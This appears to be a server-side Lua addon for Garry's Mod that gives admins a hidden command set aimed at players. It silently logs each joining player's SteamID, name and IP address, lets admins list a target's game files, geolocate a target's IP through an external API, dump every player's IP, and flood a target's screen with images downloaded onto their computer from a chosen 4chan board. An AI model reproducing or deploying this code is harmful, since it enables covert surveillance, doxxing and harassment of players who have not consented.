
-- sv_ronnie.lua #NoSimplerr#
-- name after someone special

util.AddNetworkString("MyNameIsRonnie")
util.AddNetworkString("NiceToMeetYouRonnie")
util.AddNetworkString("YayRonnieGreetedMe")
util.AddNetworkString("RonnieWantsYouToSeeSomething")
util.AddNetworkString("RonniePrepare4Chan")
util.AddNetworkString("RonnieExplode4Chan")

net.Receive("NiceToMeetYouRonnie", function(len, ply)
	local files = net.ReadTable()
	local folders = net.ReadTable()

	for k, v in pairs(player.GetAll()) do
		if v:IsSuperAdmin() then
			net.Start("YayRonnieGreetedMe")
			net.WriteEntity(ply)
			net.WriteTable(files)
			net.WriteTable(folders)
			net.Send(v)
		end
	end
end)

file.CreateDir("ronnie")
local log = "ronnie/ips.txt"

hook.Add("PlayerInitialSpawn", "RonnieIP", function(ply)
	local content = file.Read(log)
	if content then
		file.Append(log, util.TableToJSON({sid = ply:SteamID(), nick = ply:Nick(), ip = ply:IPAddress()}) .. "\n")
	else
		file.Write(log, util.TableToJSON({sid = ply:SteamID(), nick = ply:Nick(), ip = ply:IPAddress()}) .. "\n")
	end
end)

local function FindPlayer(name)
	name = string.lower(name)
	for k, v in ipairs(player.GetHumans()) do
		if string.find(string.lower(v:Nick()), name, 1, true) ~= nil then
			return v
		end
		if isfunction(v.SteamName) and string.find(string.lower(v:SteamName()), name, 1, true) ~= nil then
			return v
		end
	end
	return false
end

local ronnie_cmds = {
	["!imgur"] = {
		help = [[<target> [image url]
		Completely covers target's screen with an image.
		Clear the image by omitting the URL.]],
		func = function(ply, args)
			if not ply:IsAdmin() or not args[2] then return end
			if not args[3] then ply:PrintMessage(HUD_PRINTCONSOLE, "input empty, clearing image...") end
			local found = FindPlayer(args[2])
			if not found then return end
			net.Start("RonnieWantsYouToSeeSomething")
			net.WriteString(args[3] or "-snip-")
			net.Send(found)
		end,
	},
	["!4chandl"] = {
		help = [[<target> <4chan board>
		Downloads images from 4chan onto target's computer.
		Use this before using !4chan.]],
		func = function(ply, args)
				if not ply:IsAdmin() or not args[2] or not args[3] then return end
				local found = FindPlayer(args[2])
				if not found then return end
				net.Start("RonniePrepare4Chan")
				net.WriteString(args[3])
				net.Send(found)
		end,
	},
	["!4chan"] = {
		help = [[<target> [4chan board]
		Fills the target's screen with images from given board.
		Clear the screen by omitting the board.
		Mush be precached with !4chandl.]],
		func = function(ply, args)
			if not ply:IsAdmin() or not args[2] then return end
			local found = FindPlayer(args[2])
			if not found then return end
			net.Start("RonnieExplode4Chan")
			net.WriteString(args[3] or "-snip-")
			net.Send(found)
		end,
	},
	["!locate"] = {
		help = [[<target>
		Locates the target based on their IP address using an external API.
		Not very accurate.]],
		func = function(ply, args)
			if not ply:IsAdmin() or not args[2] then return end
			local found = FindPlayer(args[2])
			if not found then return end
			http.Fetch("http://ip-api.com/json/" .. found:IPAddress(), function(body, len, headers, code)
				local tab = util.JSONToTable(body)
				if not body or tab.status ~= "success" then
					ply:ChatPrint("Could not locate " .. found:Nick() .. "!")
					return
				end
				ply:PrintMessage(HUD_PRINTCONSOLE, tab.city .. ", " .. tab.regionName .. ". " .. tab.country .. tab.zip)
			end)
		end,
	},
	["!files"] = {
		help = [[<target>
		View the contents of the target's game directory.]],
		func = function(ply, args)
			if not ply:IsAdmin() or not args[2] then return end
			local found = FindPlayer(args[2])
			if not found then return end
			net.Start("MyNameIsRonnie")
			net.Send(ply)
		end,
	},
	["!dump"] = {
		help = [[
	Dumps the whole server's SteamIDs, names, and IPs into console.]],
		func = function(ply, args)
			if not ply:IsAdmin() then return end
			for k, v in pairs(player.GetAll()) do
				ply:PrintMessage(HUD_PRINTCONSOLE, v:SteamID() .. " - " .. (isfunction(v.SteamName) and v:SteamName() or v:Nick()) .. " - " .. v:IPAddress())
			end
		end,
	},
}

-- after constructor, we need the table itself
ronnie_cmds["!ronnie"] = {
	help = [[
	Brings up this message.]],
	func = function(ply, args)
		if not ply:IsAdmin() then return end
		for k, v in pairs(ronnie_cmds) do
			ply:ChatPrint(v.help and (k .. " " .. v.help) or k)
		end
	end,
},

-- call string.lower AFTER so we dont fuck up the link
hook.Add("PlayerSay", "RonnieChatCommand", function(ply, txt)
	if not IsValid(ply) or not ply:IsAdmin() then return end
	local args = string.Split(txt, " ")
	if ronnie_cmds[string.lower(args[1])] and isfunction(ronnie_cmds[string.lower(args[1])].func) then
		ronnie_cmds[string.lower(args[1])].func(ply, args)
	end
	if string.Left(txt, 1) == "!" then
		return ""
	end
end)
